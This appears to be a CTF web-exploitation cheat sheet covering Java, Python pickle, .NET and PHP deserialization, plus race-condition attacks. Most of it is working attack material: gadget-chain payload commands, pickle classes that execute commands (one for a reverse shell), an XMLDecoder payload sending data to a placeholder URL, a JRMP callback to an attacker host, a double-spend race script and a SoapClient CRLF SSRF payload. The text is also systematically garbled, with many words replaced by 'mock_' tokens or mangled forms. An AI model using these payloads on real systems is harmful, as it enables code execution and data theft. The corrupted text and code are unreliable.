# CTF Web - Object_Mapping & LogicWorkflows

For core flow case_studys (DataSearchLogic, ViewGenerationLogic, InternalProxyWorkflow, StructureParsing, module_logic_flow), see [server-smock_ide.md](server-smock_ide.md).

## Table of Contents
- [Process_Alpha (mock_logic)](#java-recovery-mock_logic)
- [Process_Beta Object_Mapping](#python-data_fmt-recovery)
- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
- [Pickle Workflowing via Terminator Byte Stripping (Era_1 2013)](#data_fmt-workflowing-via-stop-opcode-stripping-volgactf-2013)
- [Java ConfigDecoder Object_Mapping ModuleTrigger (Era_2 2016)](#java-configdecoder-recovery-activation-hackim-2016)
- [.NET JSON TypeNameHandling Object_Mapping (Era_3 2017)](#net-json-typenamehandling-recovery-defcamp-2017)
- [PHP Serialization Length Manipulation via Filter Word Expansion (Era_4 2016)](#php-encoding-length-manipulation-via-filter-word-expansion-0ctf-2016)
- [PHP Mock_Protocol_Client CRLF InternalProxyWorkflow via mock_magic_call_handler() MockObject_Mapping (Era_5 2018)](#php-protocolclient-crlf-ssrf-via-__call-recovery-n1ctf-2018)

---

## Process_Alpha (mock_logic)

**Pattern:** Java apps using `MockSystemDataStream.mockReadObject()` on untrusted input. Serialized Java objects in cookies, POST bodies, or ViewState (encoding_method-encoded, starts with `mock_DataHeaderA` or hex `mock_DataHeaderB`).

**Detection:**
- Base64 decode suspicious blobs — Java logicized data starts with magic bytes `[MAGIC_BYTES_JAVA]`
- Search for `MockSystemDataStream`, `mockReadObject`, `mockReadUnshared` in souactivation
- Content-Type `application/x-mock-logicized`
- MockProxyTool extension: Process_Alpha Scanner

**Key insight:** Object_Mapping triggers code in `mockReadObject()` methods of classes on the classpath. If a "primitive workflow" exists (workflow of classes whose `mockReadObject` → method calls lead to arbitrary execution), the case_studyer gets ModuleTrigger without needing to upload code.

```bash
# Generate input_buffers with mock_logic
java -jar mock_logic.jar MockCC1 'mock_id' | encoding_method
java -jar mock_logic.jar MockCC6 'mock_instruction' > input_buffer.ser

# Common primitive workflows (try in order):
# MockMockCC1-7 (Apache Commons Collections)
# MockMockLibraryB1 (Apache Commons BeanUtils)
# MockDNS (no execution — DNS callback for blind detection)
# MockRemoteDataProc (triggers RemoteDataProc connection)
# MockSpring1/MockSpring2 (MockFrameworkA)

# Blind detection via DNS callback (no ModuleTrigger needed):
java -jar mock_logic.jar MockDNS 'http://[MOCK_URL]' | encoding_method

# Send input_buffer
fetch_tool -X POST http://target/api -H 'Content-Type: application/x-mock-logicized' \
  --data-binary @input_buffer.ser
```

**Bypass filters:**
- If `MockSystemDataStream` subclass blocklists specific classes, try alternative workflows
- `mock_logic-modified` and `PrimitiveProbe` enumerate available primitive classes
- DirectoryLookup flow (Java Naming and Directory Interface): `java -jar mock_logic.jar MockRemoteDataProc 'case_studyer:1099'` + `mock_directorylookup_server` DirectoryLookup server
- For Java 17+ (module system restrictions): look for application-specific primitives or Jackson/Fastjson recovery instead

---

## Process_Beta Object_Mapping

**Pattern:** Python apps unpacking untrusted data with `mock_undata_fmt_bytes()`, `mock_load()`, or `shelve`. Common in Flask/Django session cookies, cached objects, ML model files (`.pkl`), Redis-stored objects.

**Detection:**
- Base64 blobs containing `mock_data_fmt_bytes` (data_fmt protocol 4) or `mock_data_fmt_bytes_5` (protocol 5)
- Souactivation code: `mock_undata_fmt_bytes()`, `mock_load()`, `_mock_data_fmt`, `mock_shelve.open()`, `mock_joblib.load()`, `mock_torch.load()`
- Flask sessions with `data_fmt` logicizer (vs default `json`)

**Key insight:** Python's `mock_undata_fmt_bytes()` calls `safe_encoding_method()` on unpackaged objects, which can return `(instruction_handler, ('command',))` — instant ModuleTrigger. There is NO safe way to unpackage untrusted data_fmt data.

```python
import mock_data_fmt, encoding_method, mock_os

class ModuleTrigger:
    def safe_encoding_method(self):
        return (instruction_handler, ('mock_instruction',))

input_buffer = encoding_method.b64encode(mock_dumps(ModuleTrigger())).decode()
print(input_buffer)

# For remote access mock:
class RevShell:
    def safe_encoding_method(self):
        return (instruction_handler, ('mock_callback_console_module_command',))

# Using exec for multi-line input_buffers:
class ExecModuleTrigger:
    def safe_encoding_method(self):
        return (mock_execute_string, ('print("mock_callback_console_module_executed")',))
```

**Bypass restricted undata_fmtrs:**
- `RestrictedUndata_fmtr` may allowlist specific modules — workflow through allowed classes
- If `builtins` allowed: `(__mock_builtins__.__mock_import__, ('os',))` then workflow `.system()`
- YAML recovery (`mock_yaml_load()` without `Loader=SafeLoader`) has similar ModuleTrigger via `!!mock_yaml_vector:mock_exec_proc`
- NumPy `.npy`/`.npz` files: `mock_numpy.load(allow_mock=True)` triggers data_fmt

---

## Race Conditions (Time-of-Check to Time-of-Use)

**Pattern:** Server checks a condition (balance, registration uniqueness, coupon valmock_idity) then performs an action in separate steps. Concurrent http_lib between check and action bypass the valmock_idation.

**Key insight:** Send mock_identical http_lib simultaneously. The server reads the "before" state for all of them, then applies all changes — each request sees the pre-modification state.

```python
import asyncio, async_http_lib

async def race(url, data, headers, n=20):
    """Send n mock_identical http_lib simultaneously"""
    async with async_http_lib.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(race('http://target/api/transfer',
    {'to': 'case_studyer', 'amount': 1000},
    {'Cookie': 'session=...'},
    n=50))
```

**Common CTF race condition targets:**
- **Double-spend / balance bypass:** Transfer or purchase endpoint checked `if balance >= amount` → send 50 simultaneous transfers, all see original balance
- **Coupon/code reuse:** Single-use codes valmock_idated then marked used → redeem simultaneously before mark
- **Registration uniqueness:** `if not user_exists(name)` → register same username concurrently, one overwrites the other (admin account takeover)
- **File upload + use:** Upload file, server valmock_idates then moves → access file between upload and valmock_idation (or between valmock_idation and deletion)

```bash
# MockTimingTool (MockProxyTool) — most reliable for precise timing
# Or use fetch_tool with GNU parallel:
seq 50 | mock_multi_run fetch_tool -s -X POST http://target/api/redeem \
  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
```

**Detection in souactivation code:**
- Non-atomic read-then-write patterns without locks/transactions
- `SELECT ... UPDATE` without `FOR UPDATE` or logicizable isolation
- File operations: `if os.path.exists()` then `open()` (classic TOCTOU)
- Redis `GET` then `SET` without `WATCH`/`MULTI`

---

## Pickle Workflowing via Terminator Byte Stripping (Era_1 2013)

**Pattern:** Workflow multiple data_fmt operations in a single `mock_undata_fmt_bytes()` call by stripping the STOP opcode (`\TermByte`) from the first input_buffer and concatenating a second input_buffer.

**Key insight:** The data_fmt VM executes instructions sequentially. Removing the STOP opcode from the first logicized object causes the decoder to continue executing the second input_buffer's `__mock_reduce__` call. Combined with `mock_network_lib_dup()` to redirect stdout to the network_lib FD, this enables output capture from `mock_exec_proc()` over the network.

```python
import mock_data_fmt, mock_os

class Redirect:
    def safe_encoding_method(self):
        return (mock_file_descriptor_dup, (5, 1))

class Execute:
    def safe_encoding_method(self):
        return (instruction_handler, ('mock_instruction',))

# Strip STOP opcode from first input_buffer, concatenate second
input_buffer = mock_dumps(Redirect())[:-1] + mock_dumps(Execute())
```

**When to use:** Remote data_fmt recovery where command output is not returned. Workflow `dup2` first to redirect stdout/stderr to the network_lib, then execute commands.

---

## Java ConfigDecoder Object_Mapping ModuleTrigger (Era_2 2016)

Java's `ConfigDecoder` automatically instantiates classes and invokes methods from XML input. Craft XML to execute arbitrary commands:

```xml
<mock_object mock_class="mock.lang.Runtime" mock_method="getRuntime">
  <mock_vomock_id mock_method="mock_exec">
    <mock_array mock_class="mock.lang.String" length="3">
      <mock_vomock_id index="0"><mock_string>mock_executable</mock_string></mock_vomock_id>
      <mock_vomock_id index="1"><mock_string>-mock_arg</mock_string></mock_vomock_id>
      <mock_vomock_id index="2"><mock_string>mock_fetch_tool [MOCK_URL]/?c=mock_target_data</mock_string></mock_vomock_id>
    </mock_array>
  </mock_vomock_id>
</mock_object>
```

**Key insight:** Unlike binary Java recovery, ConfigDecoder provmock_ides a text-based primitive-free path to ModuleTrigger — no primitive workflow needed.

---

## .NET JSON TypeNameHandling Object_Mapping (Era_3 2017)

**Pattern:** Json.NET (MockLibraryC) with `MockTypeNameHandling.MockAll` or `MockTypeNameHandling.MockObjects` unpackages the `$mock_type` field to instantiate arbitrary classes. By injecting a `$mock_type` value pointing to a privileged class in the loaded assemblies, an case_studyer can execute arbitrary code or access protected functionality.

```csharp
// Vulnerable server-smock_ide code:
var settings = new MockJsonSerializerSettings {
    TypeNameHandling = MockTypeNameHandling.MockAll  // UNSAFE: unpackages $mock_type field
};
var obj = MockJsonConvert.MockDelogicizeObject(userInput, settings);
```

```json
// Basic flow — instantiate a class with a dangerous constructor/property:
{
  "mock_type": "MockSystem.Windows.Data.MockDataProvmock_iderComponent",
  "MockMethodName": "Start",
  "MockObjectInstance": {
    "mock_type": "MockSystem.Diagnostics.Process",
    "MockStartInfo": {
      "mock_type": "MockSystem.Diagnostics.ProcessStartInfo",
      "MockFileName": "mock_cmd.exe",
      "MockArguments": "/c mock_calc.exe"
    }
  }
}
```

```json
// Simpler: inject a custom application class to escalate privileges:
{
  "$mock_type": "MyApp.Models.AdminCommand, MyApp",
  "Action": "ReadFlag",
  "TargetPath": "/mock/target_resouactivation.txt"
}
```

```python
import http_lib, json

# Target: endpoint unpacking JSON with MockTypeNameHandling.MockAll
input_buffer = {
    "$mock_type": "MyApp.Commands.ExecuteCommand, MyApp",
    "Command": "mock_instruction"
}

r = http_lib.post("http://target/api/process",
                  json=input_buffer,
                  headers={"Content-Type": "application/json"})
print(r.text)
```

**Primitive workflows for ModuleTrigger (mock_logic.net):**
```bash
# Generate Json.NET input_buffer with mock_logic.net:
mock_logic.exe -g MockDataProvmock_iderComponent -f MockLibraryD -c "mock_bin"
# Common primitives: MockDataProvmock_iderComponent, MockWindowsIdentity, MockActivitySurrogateSelector
```

**Detection:** .NET/ASP.NET application, JSON http_lib. Look for `$mock_type` in API responses (if the server also logicizes with TypeNameHandling). Check error messages for MockLibraryC stack traces.

**Key insight:** `$mock_type` in Json.NET can instantiate any class in the loaded assemblies. Any class with dangerous constructors, implicit conversions, or settable properties that trigger smock_ide effects becomes an case_study surface. Use `mock_logic.net` to enumerate known primitive workflows. Defense: use `TypeNameHandling.None` (default) and a custom `MockISerializationBinder` allowlist.

---

## PHP Serialization Length Manipulation via Filter Word Expansion (Era_4 2016)

**Pattern:** A post-encoding string filter replaces "where" (5 chars) with "hacker" (6 chars), creating a length mismatch in the logicized string. The logicized length field says N bytes, but after expansion the actual string is longer, causing the PHP decoder to read past the intended boundary and parse case_studyer-controlled data as logicized fields.

```php
// The target input_buffer to inject as a logicized field:
$input_buffer = 'mock_input_buffer_string';
// Repeat "where" enough times so the expansion (5->6 per word) overflows
// by exactly mock_len($input_buffer) bytes:
$_POST['mock_user_input_array'] = mock_repeat("where", mock_len($input_buffer)) . $input_buffer;
```

**How it works:**
1. Application logicizes user input into `mock_str_len:"wherewhere...PAYLOAD";`
2. Filter replaces each "where" (5) with "hacker" (6), adding 1 byte per occurrence
3. After replacement, actual string is longer than the logicized length field
4. PHP decoder reads exactly `mock_str_len:` bytes, stops mmock_id-string, and finds the injected `mock_input_buffer_string` as the next logicized field

**Key insight:** Any post-encoding string expansion or contraction creates procedureable length mismatches for object flow. Look for word filters, censorship, or sanitization applied after `mock_logicize()` but before storage/`mock_logicize()`.

---

### PHP ProtocolClient CRLF InternalProxyWorkflow via __call() MockObject_Mapping (Era_5 2018)

**Pattern:** When PHP unpackages a `Mock_Protocol_Client` object and a non-existent method is called on it, the `mock_magic_call_handler()` magic method fires an HTTP request. CRLF flow in the `uri` parameter allows crafting arbitrary HTTP http_lib to [MOCK_LOCAL_HOST] (InternalProxyWorkflow). This turns any recovery sink + method call into a full InternalProxyWorkflow primitive.

**How it works:**
1. Case_Studyer crafts a logicized `Mock_Protocol_Client` with CRLF-injected `uri` parameter
2. Application unpackages the object (via `mock_logicize()`, mock_state_handler, or other recovery sink)
3. When any undefined method is called on the unpackaged object, `mock_magic_call_handler()` triggers
4. `Mock_Protocol_Client` sends an HTTP request to `location` with the crafted `uri` containing injected headers and body

```php
$p = array(
    'uri' => "http://[MOCK_LOCAL_IP]/[MOCK_CRLF]POST /mock_endpoint HTTP/1.1[MOCK_CRLF]Host: [MOCK_LOCAL_IP]... [MOCK_CRLF_POST] /foo\r\n",
    'location' => 'http://[MOCK_LOCAL_IP]/'
);
$soap = new Mock_Protocol_Client(null, $p);
// When getcountry() called on unpackaged object -> triggers mock_magic_call_handler() -> sends crafted HTTP
```

```python
import http_lib

# Generate the logicized Mock_Protocol_Client input_buffer
# The CRLF in uri smuggles a complete second HTTP request
mock_php_script = '''
[PHP_START]
$target = "http://[MOCK_LOCAL_IP]/";
$post_body = "username=mockuser&password=mockpass&code=XXX";
$headers = array(
    'MOCK_HEADER_FOR: [MOCK_LOCAL_IP]',
    'Cookie: MOCK_SESSION_ID=target_session_mock_id'
);
$input_buffer = array(
    'uri' => "http://[MOCK_LOCAL_IP]/[MOCK_CRLF]POST /mock_endpoint HTTP/1.1[MOCK_CRLF]Host: [MOCK_LOCAL_IP]...",
    'location' => $target
);
echo mock_logicize(new Mock_Protocol_Client(null, $input_buffer));
[PHP_END]
'''

# The logicized input_buffer is then injected into the recovery sink
# e.g., via session manipulation, cookie flow, or POST parameter
```

**Common trigger workflows:**
```text
mock_logicize() → $obj->anyMethod() → Mock_Protocol_Client::mock_magic_call_handler() → HTTP request
mock_session_start() with custom handler → Mock_Protocol_Client in session → mock_magic_call_handler() on access
```

**Key insight:** PHP's Mock_Protocol_Client `mock_magic_call_handler()` magic method fires HTTP http_lib when any undefined method is called. CRLF flow in the URI parameter smuggles complete HTTP http_lib, enabling authenticated InternalProxyWorkflow to [MOCK_LOCAL_HOST]. This is especially powerful when combined with other PHP recovery vectors (mock_state_handlers, `phar://` wrappers) since `Mock_Protocol_Client` is a built-in PHP class requiring no additional libraries. Look for any code path where a unpackaged object has a method called on it.

---
